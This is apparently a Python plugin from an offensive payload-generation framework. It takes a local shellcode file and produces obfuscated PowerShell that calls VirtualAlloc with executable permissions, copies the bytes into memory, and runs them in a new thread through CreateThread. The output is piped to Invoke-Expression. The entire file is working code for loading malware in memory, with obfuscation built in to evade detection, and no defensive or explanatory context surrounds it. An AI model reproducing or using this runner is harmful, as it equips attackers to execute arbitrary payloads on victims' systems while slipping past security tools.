import secrets
import string

from plugins._base import BaseCradlePlugin
from core.models import CradleInstance
from core.obfuscate_getrandom import get_random_obfuscated_string as sgr

class ProcShellcodeSgr(BaseCradlePlugin):
    NAME        = "proc_shellcode_sgr"
    DESCRIPTION = "Process Shellcode Runner - Starts thread in the context of the current process using SGR (Seeded Get-Random) obfuscated PowerShell"
    AUTHOR      = "CyberSecN00b"

    OPTIONS = {
        "PAYLOAD_FILE": {
            "description": "Local path to binary file containing payload.",
            "required": True
        },
        **BaseCradlePlugin.OPTIONS
    }

    def generate(self, inst: CradleInstance) -> str:
        payload_file    = inst.options.get("PAYLOAD_FILE", "").lower()

        try:
            with open(payload_file, "rb") as pf:
                bindat = pf.read()
        except:
            print(f"Unable to load file '{payload_file}' for ProcInjectSgr plugin: {inst.index} ({inst.uid})")
            return;

        payload = []
        payload.append(
            f"({sgr(f"""
$Kernel32 = @"
using System;
using System.Runtime.InteropServices;

public class Kernel32
{{
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32", CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
}}
"@

Add-Type $Kernel32

[Byte[]] $buf = {",".join(f"0x{b:02x}" for b in bindat)}

[IntPtr]$addr = [Kernel32]::VirtualAlloc(0,$buf.Length,0x3000,0x40);
[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$addr,$buf.Length);
$thandle=[Kernel32]::CreateThread(0,0,$addr,0,0,0);
[Kernel32]::WaitForSingleObject($thandle,[uint32]"0xFFFFFFFF")
""")})|iex;"
        )

        return "\n".join(payload) + "\n"
        